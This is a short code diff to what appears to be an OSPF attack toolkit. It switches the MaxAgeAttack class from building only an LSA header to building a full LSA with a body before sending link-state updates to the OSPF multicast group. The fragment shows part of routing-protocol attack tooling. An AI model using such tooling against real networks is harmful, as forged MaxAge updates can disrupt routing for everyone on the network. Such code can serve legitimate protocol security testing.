@@ -1,6 +1,6 @@
 from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
 from ospf_attack.config.types import LSAConfig
-from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
+from ospf_attack.core.packet import build_lsu_packet, build_lsa_with_body, OSPF_MULTICAST_ALL
 from ospf_attack.network.sender import PacketSender
 
 
@@ -20,7 +20,7 @@ class MaxAgeAttack(BaseAttack):
     def launch(self) -> AttackResult:
         from ospf_attack.network.adapter import get_local_ip
         src_ip = get_local_ip(self.config.iface)
-        lsa = build_lsa_header(
+        lsa = build_lsa_with_body(
             lsa_type=self.config.lsa_type,
             link_state_id=self.config.link_state_id or self.config.router_id,
             advertising_router=self.config.advertising_router or self.config.router_id,
